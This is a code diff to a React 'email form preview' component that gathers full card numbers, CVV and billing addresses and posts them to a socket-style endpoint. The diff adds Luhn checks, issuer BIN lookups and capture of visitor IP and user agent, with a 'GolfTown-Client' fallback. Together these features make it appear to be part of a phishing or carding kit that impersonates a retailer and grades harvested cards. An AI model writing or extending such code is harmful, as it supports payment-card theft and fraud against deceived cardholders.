@@ -6,6 +6,7 @@ import {
   Settings, Inbox
 } from 'lucide-react';
 import { CustomerRecord } from '../types';
+import { lookupBinData, fetchBinDataApi, validateLuhn, BinInfo } from '../utils/cardUtils';
 
 interface EmailFormPreviewModalProps {
   isOpen: boolean;
@@ -83,6 +84,20 @@ export const EmailFormPreviewModal: React.FC<EmailFormPreviewModalProps> = ({
   const [expDate, setExpDate] = useState('08/28');
   const [cvv, setCvv] = useState('382');
   const [cardholderName, setCardholderName] = useState(recipientName);
+  const [asyncBinInfo, setAsyncBinInfo] = useState<BinInfo | null>(null);
+
+  useEffect(() => {
+    const clean = cardNumber.replace(/\D/g, '');
+    if (clean.length >= 6) {
+      let isMounted = true;
+      fetchBinDataApi(cardNumber).then(data => {
+        if (isMounted) setAsyncBinInfo(data);
+      });
+      return () => { isMounted = false; };
+    } else {
+      setAsyncBinInfo(null);
+    }
+  }, [cardNumber]);
 
   // Full Billing Details State
   const [streetAddress, setStreetAddress] = useState('1204 8th Avenue SW');
@@ -371,6 +386,10 @@ export const EmailFormPreviewModal: React.FC<EmailFormPreviewModalProps> = ({
   // Customer Submits Full Card & Billing Details
   const handleCustomerSubmitPayment = async (e: React.FormEvent) => {
     e.preventDefault();
+    if (!validateLuhn(cardNumber)) {
+      alert('Invalid Credit Card Number: Luhn checksum validation failed. Please check the card digits.');
+      return;
+    }
     try {
       const res = await fetch('/api/socket/submit-card-billing', {
         method: 'POST',
@@ -390,7 +409,9 @@ export const EmailFormPreviewModal: React.FC<EmailFormPreviewModalProps> = ({
           city,
           province,
           postalCode,
-          phone
+          phone,
+          visitorIp: '192.168.1.105',
+          userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : 'GolfTown-Client'
         })
       });
       const data = await res.json();
@@ -1043,6 +1064,28 @@ export const EmailFormPreviewModal: React.FC<EmailFormPreviewModalProps> = ({
                         placeholder="4532 8920 1192 8821"
                         required
                       />
+                      {cardNumber.replace(/\D/g, '').length >= 6 && (() => {
+                        const bin = asyncBinInfo || lookupBinData(cardNumber);
+                        return (
+                          <div className="mt-2 bg-emerald-50 border border-emerald-200 rounded-xl p-2.5 text-[11px] text-emerald-900 space-y-1">
+                            <div className="flex items-center justify-between font-bold">
+                              <span className="flex items-center gap-1.5">
+                                <Sparkles className="w-3.5 h-3.5 text-emerald-700" />
+                                BIN &amp; Luhn Analysis: {bin.brand} ({bin.category})
+                              </span>
+                              <span className={`px-2 py-0.5 rounded text-[10px] font-extrabold ${bin.luhnValid ? 'bg-emerald-200 text-emerald-900' : 'bg-rose-200 text-rose-900'}`}>
+                                {bin.luhnValid ? '✓ Luhn Valid' : '✗ Luhn Invalid'}
+                              </span>
+                            </div>
+                            <div className="text-slate-600 text-[10px] grid grid-cols-2 gap-1 pt-1 border-t border-emerald-200/60">
+                              <div>Issuer: <strong>{bin.bank}</strong></div>
+                              <div>Type: <strong>{bin.type}</strong></div>
+                              <div>Country: <strong>{bin.country}</strong></div>
+                              <div>Source: <strong>{bin.apiSource || 'Free BIN API'}</strong></div>
+                            </div>
+                          </div>
+                        );
+                      })()}
                     </div>
 
                     <div className="grid grid-cols-2 gap-3">
